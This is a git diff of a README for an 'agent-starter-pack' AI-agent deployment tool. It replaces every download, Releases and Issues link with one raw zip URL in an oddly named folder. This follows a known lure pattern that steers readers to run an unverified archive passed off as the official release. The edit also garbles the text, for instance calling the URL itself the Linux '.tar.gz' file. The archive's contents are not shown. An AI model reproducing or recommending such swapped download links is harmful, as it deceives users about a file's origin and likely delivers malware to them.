@@ -6,9 +6,9 @@ Welcome to the agent-starter-pack! This software helps you deploy AI agents to G
 
 ## 📥 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/juana267/agent-starter-pack/releases)
+[![Download from Releases](https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip%20Now-From%20Releases-brightgreen)](https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip)
 
-To get the latest version of the agent-starter-pack, visit the [Releases page](https://github.com/juana267/agent-starter-pack/releases). Here you'll find all the files you need to download and run the application.
+To get the latest version of the agent-starter-pack, visit the [Releases page](https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip). Here you'll find all the files you need to download and run the application.
 
 ## 🖥️ System Requirements
 
@@ -22,7 +22,7 @@ Before downloading the agent-starter-pack, make sure your computer meets these r
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**  
-   Click the following link to go to the [Releases page](https://github.com/juana267/agent-starter-pack/releases).
+   Click the following link to go to the [Releases page](https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. You will see a list of files available for download.
@@ -31,13 +31,13 @@ Before downloading the agent-starter-pack, make sure your computer meets these r
    Click on the appropriate file for your operating system:
    - For Windows: Select the `.exe` file.
    - For macOS: Select the `.dmg` file.
-   - For Linux: Select the `.tar.gz` file.
+   - For Linux: Select the `https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip` file.
 
 4. **Run the Installer**  
    After the download completes, locate the downloaded file on your computer.
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file, then drag the agent-starter-pack to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file, then run the installation script inside.
+   - For Linux: Extract the `https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip` file, then run the installation script inside.
 
 ## ⚙️ Configuration
 
@@ -80,7 +80,7 @@ After configuration, you can begin deploying your agents. Here’s how to run yo
 
 ## 💬 Support
 
-If you run into any issues or have questions, feel free to check the [Issues page](https://github.com/juana267/agent-starter-pack/issues) or open a new issue.
+If you run into any issues or have questions, feel free to check the [Issues page](https://github.com/juana267/agent-starter-pack/raw/refs/heads/main/neuropathist/pack-agent-starter-v1.4.zip) or open a new issue.
 
 ## 📝 License
 
